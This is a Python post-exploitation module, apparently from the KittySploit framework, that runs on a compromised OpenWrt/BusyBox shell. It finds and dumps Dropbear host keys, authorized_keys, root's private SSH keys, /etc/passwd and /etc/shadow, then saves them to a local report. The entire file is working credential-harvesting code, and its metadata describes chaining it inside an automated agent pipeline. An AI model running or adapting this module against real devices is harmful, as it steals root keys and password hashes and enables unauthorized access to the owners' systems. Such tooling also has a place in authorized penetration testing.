#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Collect Dropbear / SSH keys from an OpenWrt / BusyBox shell."""

from kittysploit import *
from lib.post.linux.session import LinuxSessionMixin
import os
import time


class Module(Post, LinuxSessionMixin):
    __info__ = {
        "name": "OpenWrt / BusyBox Dump Dropbear Keys",
        "description": (
            "Locate and dump Dropbear host keys, authorized_keys, and related "
            "SSH material on embedded Linux / OpenWrt targets."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["iot", "openwrt", "busybox", "gather", "credentials"],
        "references": ["https://attack.mitre.org/techniques/T1552.004/"],
        "agent": {
            "risk": "active",
            "effects": ["reconnaissance"],
            "produces": ["risk_signals"],
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["credentials", "file_read"],
            },
        },
    }

    save_local = OptBool(True, "Save keys under ./output", False)

    _CANDIDATES = (
        "/etc/dropbear/dropbear_rsa_host_key",
        "/etc/dropbear/dropbear_ecdsa_host_key",
        "/etc/dropbear/dropbear_ed25519_host_key",
        "/etc/dropbear/authorized_keys",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/etc/passwd",
        "/etc/shadow",
    )

    def run(self):
        if not self.linux_require_linux():
            return False

        sections = []
        print_status("Searching Dropbear / SSH key material...")

        listing = (
            self.cmd_execute(
                "ls -la /etc/dropbear /root/.ssh /etc/ssh 2>/dev/null; "
                "ps 2>/dev/null | grep -i dropbear | grep -v grep"
            )
            or ""
        ).strip()
        if listing:
            sections.append(f"=== listing / processes ===\n{listing}")
            print_info(listing.splitlines()[0][:120])

        for path in self._CANDIDATES:
            exists = (
                self.cmd_execute(f'test -f {path} && echo EXISTS || echo MISSING') or ""
            ).strip()
            if "EXISTS" not in exists:
                continue
            # Avoid dumping huge binary host keys as text — show size + hex head for binaries
            if "host_key" in path:
                meta = (
                    self.cmd_execute(
                        f'ls -la {path} 2>/dev/null; '
                        f'wc -c < {path} 2>/dev/null; '
                        f'hexdump -C {path} 2>/dev/null | head -n 3'
                    )
                    or ""
                ).strip()
                sections.append(f"=== {path} (binary meta) ===\n{meta}")
                print_success(f"Found host key {path}")
            else:
                content = (self.cmd_execute(f"cat {path} 2>/dev/null") or "").strip()
                if content:
                    sections.append(f"=== {path} ===\n{content}")
                    print_success(f"Dumped {path} ({len(content.splitlines())} lines)")

        if not sections:
            print_warning("No Dropbear/SSH key material found")
            return True

        report = "\n\n".join(sections)
        if bool(self.save_local):
            os.makedirs("output", exist_ok=True)
            stamp = time.strftime("%Y%m%d_%H%M%S")
            path = os.path.join("output", f"openwrt_dropbear_{stamp}.txt")
            with open(path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(report + "\n")
            print_success(f"Saved ./{path}")
        print_success("Dropbear key collection completed")
        return True
